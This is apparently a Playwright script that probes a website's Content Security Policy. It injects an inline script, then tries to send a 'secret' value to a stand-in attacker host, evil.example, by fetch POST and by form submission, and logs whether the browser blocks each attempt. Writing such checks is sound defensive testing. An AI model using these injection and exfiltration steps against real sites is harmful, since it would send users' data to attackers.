import { chromium } from '@playwright/test';

const browser = await chromium.launch({ channel: 'chrome', headless: true });
const page = await browser.newPage();
const failed = [];
const responses = [];
const logs = [];
page.on('requestfailed', (request) => {
  if (request.url().includes('evil.example')) failed.push(`${request.url()}:${request.failure()?.errorText || 'failed'}`);
});
page.on('response', (response) => {
  if (response.url().includes('evil.example')) responses.push(response.url());
});
page.on('console', (message) => logs.push(message.text()));
await page.goto('https://dc01.wstera.com', { waitUntil: 'networkidle' });
await page.evaluate(() => {
  const script = document.createElement('script');
  script.textContent = 'window.__inlineCspProbe=7';
  document.body.appendChild(script);
});
const inline = await page.evaluate(() => globalThis.__inlineCspProbe ?? null);
await page.evaluate(async () => {
  try {
    await fetch('https://evil.example/exfil', { method: 'POST', body: 'secret' });
  } catch {}
});
await page.evaluate(() => {
  const form = document.createElement('form');
  form.action = 'https://evil.example/form';
  form.method = 'POST';
  const input = document.createElement('input');
  input.name = 'x';
  input.value = 'secret';
  form.appendChild(input);
  document.body.appendChild(form);
  form.submit();
});
await page.waitForTimeout(700);
console.log('INLINE_SCRIPT_CSP_PROBE=' + inline);
console.log('EVIL_RESPONSES=' + JSON.stringify(responses));
console.log('EVIL_FAILED=' + JSON.stringify(failed));
console.log('FINAL_URL=' + page.url());
console.log('CSP_LOGS=' + JSON.stringify(logs.filter((line) => /Content Security Policy|Refused/i.test(line))));
await browser.close();
